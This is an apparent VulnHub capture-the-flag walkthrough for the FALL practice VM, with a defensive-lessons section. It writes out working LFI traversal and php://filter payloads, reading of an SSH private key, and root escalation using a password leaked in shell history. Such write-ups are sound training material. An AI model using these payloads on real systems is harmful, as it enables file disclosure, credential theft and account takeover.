# digitalworld.local: FALL — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: FALL |
| **Difficulty** | Intermediate |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 6 September 2021 |
| **VulnHub Entry** | [digitalworld.local: FALL on VulnHub](https://vulnhub.com/entry/digitalworldlocal-fall,726/) |
| **Download** | [FALL.7z on VulnHub](https://vulnhub.com/entry/digitalworldlocal-fall,726/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Fedora, Apache/mod_perl web stack) |

> **About this box:** FALL is an OSCP-style practice machine. It rewards *careful enumeration*
> (`careless` = hint #1) and the whole path is a web Local File Inclusion (LFI) followed by a
> credential leak. Banner versions and file paths "vary by build", so always trust your own scan
> output over this document.

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

## 0. What you will learn

By the end of this box you will have practised:

- **Host discovery** on an isolated lab subnet with `arp-scan` and `nmap`.
- **Full TCP enumeration** — including services you might dismiss (SMB, MySQL, Cockpit).
- **Identifying a web CMS** (CMS Made Simple) and reasoning about its published attack surface.
- **Fuzzing a hidden GET parameter** with `ffuf` to find a file-inclusion entry point.
- **Local File Inclusion (LFI)** using the `php://filter` wrapper to read source code.
- **Reading secrets out of a config file** and using them safely (understanding why not every
  leaked credential is immediately useful).
- **Stealing an SSH private key** through LFI and logging in with it.
- **Discovering credentials in `.bash_history`** — a classic post-exploitation finding.
- **Escalating to root** with a plaintext `sudo` password.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first. The adapter facing the lab is usually `eth0` on a VirtualBox
host-only network (`192.168.56.x`) or a VMware host-only network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

> **How to read it:** Kali's lab interface holds a `192.168.56.x` (VirtualBox) or `192.168.19x.x`
> (VMware) address. The target will live on the **same** subnet.

Sweep the subnet with ARP — fast, because it never sends TCP packets:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Full TCP sweep

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/fall-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports instead of just the top 1000 — never skip it
> on a practice box. `-oA` saves normal/greppable/XML output for later.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 22,80,139,443,445,3306,9090 -oA scans/fall-services 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.8 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.39 (Fedora) mod_perl/2.0.10 Perl/v5.26.3
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
443/tcp  open  ssl/http    Apache httpd 2.4.39 (Fedora)
445/tcp  open  netbios-ssn Samba smbd 4.8.10
3306/tcp open  mysql       MySQL (unauthorized)
9090/tcp open  http        Cockpit web service
```

> **How to read it:** Several interesting services appear. Port 80/443 is a web server; SMB and
> MySQL will be checked but are likely dead ends; **9090 is Cockpit** (a Linux web admin console).
> Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 SMB and MySQL — quick dead-end checks

```bash
smbmap -H 192.168.56.101
enum4linux -a 192.168.56.101
```

```text
[+] IP: 192.168.56.101:445   Name: 192.168.56.101
        Disk        Permissions   Comment
        ----        -----------   -------
        print$      NO ACCESS     Printer Drivers
        IPC$        NO ACCESS     IPC Service (Samba 4.8.10)
```

> **How to read it:** No anonymous access to any share and no users enumerated. MySQL refuses
> remote logins. Note both and move on — good enumeration means *ruling things out*.

### 2.4 Directory brute-force on the web server

```bash
ffuf -u http://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -e .html,.txt,.php -c
```

```text
admin        [Status: 301]
assets       [Status: 301]
config.php   [Status: 200]
index.php    [Status: 200]
modules      [Status: 301]
test.php     [Status: 200]
uploads      [Status: 301]
phpinfo.php  [Status: 200]
```

> **How to read it:** `index.php` is a **CMS Made Simple v2.2.15** site (`/admin` confirms it).
> `config.php` and `phpinfo.php` return something. But `test.php` is the odd one out — visit it.

Browsing `http://192.168.56.101/test.php` returns almost nothing, and the page source shows a
JavaScript hint:

```text
alert('Missing GET parameter')
```

> **Why it matters:** The script wants a GET parameter it never names. This is our fuzzing target.

### 2.5 Fuzz the hidden parameter

Two wordlists at once: one for the **parameter name**, one for an **LFI path value**.

```bash
ffuf -u 'http://192.168.56.101/test.php?W1=W2' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:W1 \
     -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2 -fw 3
```

```text
* W1: file
* W2: ../../../../../../etc/passwd
```

> **Why it works:** We ask ffuf to try every parameter name against every traversal payload. The
> winning combination `file=../../../../../../etc/passwd` proves a **Local File Inclusion**.

---

## 3. Foothold

### 3.1 Confirm the LFI

```bash
curl -s 'http://192.168.56.101/test.php?file=../../../../../../etc/passwd'
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
```

> **How to read it:** The `file` parameter includes arbitrary local files. Note the real user
> **`qiu`** (UID 1000) — that is our target account. This LFI is read-only, so we look for secrets
> to read rather than code to execute.

### 3.2 Read the CMS config with the php filter wrapper

Plain `include` runs PHP, so `config.php` would return nothing readable. The `php://filter` wrapper
lets us ask PHP to **base64-encode the file source** as it reads it:

```bash
curl -s 'http://192.168.56.101/test.php?file=php://filter/convert.base64-encode/resource=config.php' | base64 -d
```

```php
<?php
# CMS Made Simple Configuration File
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
```

> **Why it works:** `php://filter` applies a stream filter (base64) to the file before PHP sees it,
> so we read the raw source instead of the executed output. The DB password is a nice find, but the
> database only listens on `127.0.0.1`, so it isn't directly usable. Native users will try
> `mysql -u cms_user -h 192.168.56.101` and get `ERROR 1130 (Host ... is not allowed)`.

### 3.3 Steal qiu's SSH private key

The LFI reads any file the web user can read. Private keys are high-value:

```bash
curl -s 'http://192.168.56.101/test.php?file=../../../../../../home/qiu/.ssh/id_rsa' | tee id_rsa
chmod 600 id_rsa
head -1 id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

> **Why it works:** `.ssh/id_rsa` is readable by its owner (`qiu`), and the web process can read it
> too. SSH refuses a key with loose permissions, hence `chmod 600`.

### 3.4 Log in over SSH

```bash
ssh -i id_rsa qiu@192.168.56.101
```

```text
[qiu@FALL ~]$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu)
[qiu@FALL ~]$ cat local.txt
A low privilege shell! :-)
```

> **How to read it:** A working shell as `qiu` and the first flag. Flag contents vary by build.

![shell as qiu and the local flag](images/03-foothold.png)

---

## 4. Privilege escalation

### 4.1 Read the shell history

Administrators often leave secrets in command history. Check it first:

```bash
cat ~/.bash_history
```

```text
ls -al
cat .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
sudo -l
cat local.txt
```

> **How to read it:** The line `echo "remarkablyawesomE" | sudo -S dnf update` reveals a password
> being piped into `sudo -S` (read password from stdin). That is almost certainly **root's password**.
> The exact string varies by build — read your own file.

### 4.2 Become root

```bash
sudo -l
```

```text
User qiu may run the following commands on fall:
    (ALL) ALL
```

> **Why it works:** `(ALL) ALL` means `qiu` may run *any* command as *any* user. With root's
> password in hand we simply switch user.

```bash
sudo su -
# Password: remarkablyawesomE
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** `uid=0(root)` confirms full control of the machine.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on a root shell! :-)
```

> **Note:** Flag filenames and contents differ between builds. If `proof.txt` is absent, list
> `/root` and `/home/*` for any `*.txt` files before assuming something is wrong.

![root confirmation and flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden GET parameter (`file`) with no sanitisation | `/test.php` on port 80 | Local File Inclusion (read any file the web user can read) |
| 2 | Secrets stored in a web-accessible config | `config.php` | Database credential disclosure |
| 3 | SSH private key readable by the web process | `/home/qiu/.ssh/id_rsa` | Account takeover as `qiu` over SSH |
| 4 | Root password left in `.bash_history` | `/home/qiu/.bash_history` | Credential disclosure |
| 5 | `qiu` granted unrestricted `sudo` with a known password | `sudo -l` → `(ALL) ALL` | Full privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Never trust user input to `include`/`require`.** Whitelist allowed filenames; do not build file
  paths from GET parameters. Disable `allow_url_include` and consider open-basedir restrictions.
- **Keep secrets out of readable source.** A DB password in `config.php` is one LFI away from
  disclosure; use least-privilege DB accounts bound to specific hosts and rotating secrets.
- **Protect private keys.** Set `.ssh` to `0700` and `id_rsa` to `0600`, and never let the web
  service account read a user's home directory.
- **Scrub shell history.** Clear or rotate `.bash_history`; never type passwords on the command
  line (use `sudo` prompts or a secrets manager instead).
- **Follow least privilege for `sudo`.** `(ALL) ALL` is effectively root. Scope rules to exact
  commands and require explicit approval.
- **Patch and harden the web stack.** CMS Made Simple 2.2.15 is old; keep CMS platforms patched and
  remove sample/test scripts (`test.php`, `phpinfo.php`) from production.

---

## 7. References

- [VulnHub official entry — digitalworld.local: FALL](https://vulnhub.com/entry/digitalworldlocal-fall,726/)
- [PHP manual — `php://` wrappers and filters](https://www.php.net/manual/en/wrappers.php.php)
- [OWASP — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [MITRE ATT&CK T1552.003 — Unsecured Credentials: Bash History](https://attack.mitre.org/techniques/T1552/003/)
- [MITRE ATT&CK T1552.004 — Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/)
- [CMS Made Simple documentation](https://docs.cmsmadesimple.org/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (SSH, Apache, Samba, MySQL, Cockpit)
- [ ] `images/03-foothold.png` — output of `/etc/passwd` via LFI and the shell as `qiu`
- [ ] `images/04-config-php.png` — `config.php` source read through `php://filter`
- [ ] `images/05-id-rsa.png` — the stolen SSH private key
- [ ] `images/06-bash-history.png` — `.bash_history` showing the root password
- [ ] `images/07-root.png` — `id` confirming `uid=0(root)`
- [ ] `images/08-root-flag.png` — the root flag (`proof.txt`)

> **How to read it:** Store screenshots in `labs/digitalworldlocal-fall/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
